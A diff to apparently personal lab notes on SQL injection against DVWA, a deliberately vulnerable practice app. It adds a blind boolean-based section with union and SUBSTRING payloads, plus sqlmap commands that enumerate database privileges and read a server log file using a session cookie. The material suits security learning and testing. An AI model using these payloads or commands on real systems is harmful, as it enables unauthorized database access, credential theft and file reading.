@@ -135,7 +135,7 @@ It is important to note that while testing against this attack, it is not enough
 
   ###  testing SQL injection
 
-
+### Error based
 #### USING SQLMAP (AUTOMATED)
 Also you can try SQLMAP in DVWA SQL INJECTION, it works just fine
 
@@ -335,7 +335,39 @@ We have information_schema && dvwa----database name
 
 
                                ' union select (select group_concat(user," ",password," ",first_name," ",last_name SEPARATOR '\n')from dvwa.users),2-- -
+ 
+ ### Blind based sql injection
+    
+Blind SQL Injections occur when the affected application:
+
+    1. Does NOT return any SQL error messages or output.
+
+     2. Does NOT output any data to the user.
+
+
+ Testing
+   
+      1' union select 1,user() -- -
+ In Blind Boolean-Based SQL Injections, we can ask the database a series of true or false questions to extract information.
+ For instance, we can ask the question, is the first character of the server's hostname a? If this is true, the application will return the message User ID exists in the database..
+FIRST CHARACTER: 
+   
+    1' AND SUBSTRING(user(),1,1)='r' -- 
+SECOND CHARACTER:
+   
+    1' AND SUBSTRING(user(),1,2)='ro' -- -
+    
+  ### USing sql map more
   
+   1. check logged in user prevelege
+   
+            sqlmap -u "http://192.168.125.150/dvwa/vulnerabilities/sqli_blind/?id=1&Submit=Submit#" --cookie="PHPSESSID=r97n54ijbn5m8ofn0ug04fk9d7;security=low" --keep-alive --threads 8 --risk 3 --level 5 --dbms=mysql --current-user --privileges
+
+2. Reading files from server if current user has read access permission
+
+
+          sqlmap -u "http://192.168.125.150/dvwa/vulnerabilities/sqli_blind/?id=1&Submit=Submit#" --cookie="PHPSESSID=r97n54ijbn5m8ofn0ug04fk9d7;security=low" --keep-alive --threads 8 --risk 3 --level 5 --dbms=mysql --current-user --batch --file-read "/var/log/apache2/access.log"
+          
  ## 4. OS Command Injection
  
   Executing os specific commands
